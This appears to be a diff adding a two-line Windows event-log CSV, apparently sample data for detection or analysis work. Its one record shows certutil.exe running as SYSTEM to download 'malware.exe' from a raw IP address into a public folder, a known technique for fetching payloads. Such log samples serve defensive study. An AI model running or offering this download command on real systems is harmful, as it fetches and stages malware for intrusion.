@@ -1,0 +1,2 @@
+Timestamp,EventID,ProcessName,ProcessID,User,CommandLine
+2026-06-17 15:15:00,4688,certutil.exe,10214,SYSTEM,certutil.exe -urlcache -f http://104.244.42.1/malware.exe C:\Users\Public\malware.exe
